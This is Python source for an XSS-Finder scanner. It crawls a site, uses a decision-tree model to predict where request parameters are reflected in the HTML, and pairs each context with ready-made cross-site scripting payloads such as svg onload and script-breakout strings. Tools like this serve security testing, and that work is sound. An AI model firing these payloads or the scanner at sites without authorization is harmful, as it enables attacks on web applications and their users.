from sklearn.feature_extraction.text import CountVectorizer
from sklearn.tree import DecisionTreeClassifier
from urllib.parse import urljoin, urlparse
from collections import Counter
from lxml import html as lxml_html
from bs4 import BeautifulSoup
import pandas as pd
import argparse
import sys
import os
import queue
import signal
import requests
import warnings
import shutil
import html

current_dir = os.path.dirname(__file__)
parent_dir = os.path.abspath(os.path.join(current_dir, os.pardir))
sys.path.append(parent_dir)


class Banner:
    @staticmethod
    def display() -> str:
        banner = """
        _____________________________
        < XSS-Finder by @OsmanTunahan >
        -----------------------------
                \\  ^__^
                 \\ (oo)\\_______
                   (__)\\       )\\/ 
                        ||----w |
                        ||     ||

        Author: OsmanTunahan
        Github: https://www.github.com/OsmanTunahan
        """
        print(banner)


class HttpRequest:
    def __init__(self, user_agent=None, custom_headers=None, custom_cookie=None):
        self.headers = {"User-Agent": user_agent} if user_agent else {}
        if custom_headers:
            self.headers.update(custom_headers)
        if custom_cookie:
            self.headers["Cookie"] = custom_cookie

    def send(self, target_url, request_data=None, form_data=None):
        try:
            if form_data is not None:
                response = requests.post(target_url, data=form_data, headers=self.headers)
            elif request_data is not None:
                response = requests.get(target_url, params=request_data, headers=self.headers)
            else:
                response = requests.get(target_url, headers=self.headers)
            return response.text
        except Exception as e:
            print(f"[!] Error occurred while sending request: {e}")
            return None


class HtmlParser:
    @staticmethod
    def parse_html(html_content):
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", category=UserWarning)
            return BeautifulSoup(html_content, 'html.parser')

    @staticmethod
    def parse_url(url):
        parsed_url = urlparse(url)
        return {
            "scheme": parsed_url.scheme,
            "domain": parsed_url.netloc,
            "path": parsed_url.path,
            "query": parsed_url.query,
            "params": parsed_url.params,
            "fragment": parsed_url.fragment
        }

    @staticmethod
    def parse_http_headers(http_headers):
        headers_dict = {}
        for header in http_headers.split('\n'):
            if ':' in header:
                key, value = header.split(':', 1)
                headers_dict[key.strip()] = value.strip()
        return headers_dict

    @staticmethod
    def parse_form(soup):
        form = soup.find("form")
        if not form:
            return None, None

        form_method = form.get("method").lower() if form.get("method") else "get"
        form_inputs = form.find_all("input")
        data = {input_field.get("name"): input_field.get("value", "jam") for input_field in form_inputs if input_field.get("name")}

        return form_method, data


class PayloadGenerator:
    def __init__(self):
        self.payloads = {
            'Attribute Name': [
                {"payload": "\"><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"},
                {"payload": " onload=prompt`964864` ", "find": "//*[@onload[contains(.,964864)]]"}
            ],
            'Attribute Value': [
                {"payload": "\"><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"},
                {"payload": "'\" onload=prompt`964864` ", "find": "//*[@onload[contains(.,964864)]]"}
            ],
            'HTML Tag': [
                {"payload": "<svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"}
            ],
            'Comment': [
                {"payload": "--><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"}
            ],
            'Js Single Quote': [
                {"payload": "</script><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"},
                {"payload": "'); prompt`964864`;//", "find": '//script[contains(text(), "prompt`964864`")]'}
            ],
            'Js Double Quote': [
                {"payload": "</script><svg onload=prompt`964864`>", "find": "//svg[@onload[contains(.,964864)]]"},
                {"payload": "\")-prompt`964864`-//", "find": '//script[contains(text(), "prompt`964864`")]'}
            ]
        }

    def generate(self, context):
        return self.payloads.get(context, [])


class ModelTrainer:
    def __init__(self, data_path):
        self.data_path = data_path

    def train(self):
        data = pd.read_csv(self.data_path)
        X = data['HTML Content']
        y = data['Label']
        vectorizer = CountVectorizer()
        X_vectorized = vectorizer.fit_transform(X)
        classifier = DecisionTreeClassifier()
        classifier.fit(X_vectorized, y)
        return classifier, vectorizer


class XssScanner:
    def __init__(self, classifier, vectorizer):
        self.classifier = classifier
        self.vectorizer = vectorizer

    def predict_context(self, html_content):
        html_escaped = html.escape(html_content)
        html_vectorized = self.vectorizer.transform([html_escaped])
        return self.classifier.predict(html_vectorized)[0]

    def get_majority_context(self, contexts):
        context_counter = Counter(contexts)
        return context_counter.most_common(1)[0][0]

    def predict_reflection_contexts(self, html_response_lines, reflections):
        reflection_contexts = []
        for reflection_param, reflection_value in reflections:
            for i, line in enumerate(html_response_lines):
                if reflection_value in line:
                    context_lines = html_response_lines[max(0, i - 2):min(len(html_response_lines), i + 3)]
                    context_html = '\n'.join(context_lines)
                    predicted_context = self.predict_context(context_html)
                    reflection_contexts.append((reflection_param, predicted_context))
                    break
        return reflection_contexts


class Crawler:
    @staticmethod
    def crawl(base_url):
        visited = set()
        failed = set()
        urls_to_visit = queue.Queue()
        urls_in_queue = set()
        urls_to_visit.put(base_url)
        urls_in_queue.add(base_url)
        base_domain = urlparse(base_url).netloc

        while not urls_to_visit.empty():
            current_url = urls_to_visit.get()
            urls_in_queue.remove(current_url)
            if current_url in visited or current_url in failed:
                continue
            try:
                response = requests.get(current_url)
                response.raise_for_status()
                visited.add(current_url)
                parser = lxml_html.fromstring(response.text)

                for element in parser.xpath('//a[@href]'):
                    link = element.get('href')
                    if not link:
                        continue
                    full_url = urljoin(current_url, link)
                    full_domain = urlparse(full_url).netloc
                    if full_domain == base_domain and full_url not in visited and full_url not in urls_in_queue:
                        urls_to_visit.put(full_url)
                        urls_in_queue.add(full_url)

                yield current_url

            except requests.exceptions.RequestException:
                failed.add(current_url)


class ConsoleOutput:
    @staticmethod
    def print_separator():
        terminal_width = shutil.get_terminal_size((80, 20)).columns
        separator = '-' * (terminal_width // 3) + ' XSSFinder ' + '-' * (terminal_width // 3)
        if len(separator) > terminal_width:
            separator = separator[:terminal_width]
        print(separator)

    @staticmethod
    def print_sub_separator():
        terminal_width = shutil.get_terminal_size((80, 20)).columns
        separator = '-' * (terminal_width // 3)
        if len(separator) > terminal_width:
            separator = separator[:terminal_width]
        print(separator)

    @staticmethod
    def print_reflections(reflection_contexts):
        print("[+] Reflections and Predicted Contexts:")
        for reflection, context in reflection_contexts:
            print(f"[+] Reflection Parameter: {reflection}, Predicted Context: {context}")

    @staticmethod
    def print_payload_suggestions(whole_dict):
        ConsoleOutput.print_sub_separator()
        print("[+] Stealth-mode: Payloads suggested but not executed.")
        for key in whole_dict:
            print(f"[+] Parameter: {key}, Suggested Payload: {whole_dict[key][0]['payload']}")

